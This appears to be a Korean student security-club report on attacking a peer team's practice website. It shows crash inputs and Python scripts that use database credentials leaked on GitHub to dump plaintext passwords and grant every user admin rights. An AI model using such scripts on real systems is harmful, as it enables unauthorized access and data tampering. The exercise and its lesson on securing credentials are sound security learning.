# SHA-July-3에 대한 보고서

SHA-July-3는 ChatGPT를 통해 구현한 웹사이트로, 글 및 댓글 작성 기능이 있는 게시판을 구현하는 것이 목표였다.
사용한 기술 스택은 프론트엔드에 React, 백엔드에 Flask를 사용했다.
사이트 구현 과정에서 유저 authentication 기능에서 문제가 생겼고 (백엔드에서 토큰을 생성하는 데에 문제가 있었음) 결국 완성되지 못했다.
사이트를 출시할 당시 [server.py](https://github.com/UOS-SHA/SHA-July-3/blob/master/flask-server/server.py)는 동일한 유저명을 갖는 서로 다른 SQL 쿼리에 대해 에러를 처리하지 못해 서버가 계속 다운되었다.

# SHA-July-2에 대한 보고서

## 서버 다운

처음에는 admin 페이지에 접속하는 공략법을 찾지 못해 서버 자체를 다운시키는 것에 집중하였다.

![image](https://github.com/user-attachments/assets/d323bf2d-c2f4-410d-9753-9d9012b98e2d)

첫 시도는 가입 시 긴 유저명을 넣는 것이었다. 서버 DB에서 유저명 필드는 `varchar(50)`으로 정의되어 있어 이 부분에서 오류가 발생해 서버가 다운된 것으로 보인다.

![image](https://github.com/user-attachments/assets/77744dc8-903d-450c-aa3b-d09312eedbcd)

두 번째 시도는 포인트에 소수점 숫자를 넣는 것이었다. 아마 서버 DB에서 포인트 필드가 `int`로 정의되어 있어 발생하는 오류로 보인다.

## 서버 침입

그러던 중, [SHA-July-2의 레포지토리](https://github.com/UOS-SHA/SHA-July-2/blob/main/server/Server.py)에서 DB 주소와 유저명, 비밀번호가 노출되어 있는 것을 발견했다.
다음의 파이썬 스크립트를 작성해 서버에 `SELECT` 쿼리를 요청해보기로 했다.

```py
import mysql.connector

db = mysql.connector.connect(
    host="...",
    user="admin",
    password="...",
    database="database_login"
)

if __name__ == "__main__":
    cursor = db.cursor()
    cursor.execute("SELECT * FROM users;")

    for user in cursor.fetchall():
        for column in user:
            print(column, end=' ')
        print()
```

출력 결과는 다음과 같았다.

```
1234 1234 (...) 502 user
admin adminadminadminadminadmin (...) 0 admin
admin'-- 1234 (...) 900 user
```

여기서 두 번째 열을 평문으로 저장된 비밀번호로 추측하고 로그인을 시도했다.

![image](https://github.com/user-attachments/assets/93b27130-ceb4-4b38-b864-e8ffdc7efd2c)

로그인에 성공한 후, 위의 스크립트를 확장해 모든 유저에게 admin 권한을 주고 포인트를 int형 최댓값으로 설정하게끔 만들었다.

```py
import mysql.connector

db = mysql.connector.connect(
    host="...",
    user="admin",
    password="...",
    database="database_login"
)

if __name__ == "__main__":
    cursor = db.cursor()

    cursor.execute("UPDATE users SET role='admin';")
    cursor.execute("UPDATE users SET point=2147483647;")

    cursor.execute("SELECT username, password, point, role FROM users;")

    for user in cursor.fetchall():
        for column in user:
            print(column, end=' ')
        print()

    cursor.execute("DESCRIBE users;")
    for column in cursor.fetchall():
        print(column)

    db.commit()
```

![image](https://github.com/user-attachments/assets/9016d559-9010-4167-8f31-13a79c27fa01)

## 배운 점

인터넷에서 백엔드 개발과 관련된 강좌나 영상을 볼 때, DB의 유저명과 비밀번호 등은 서버의 환경변수로 저장하라는 이야기를 많이 들었다.
실제로 외부에 노출된 DB 관련 credential을 통해 서비스에 영향을 끼친다는 점을 체험하고 나니 환경변수 사용의 중요성을 다시금 깨닫게 되었다.
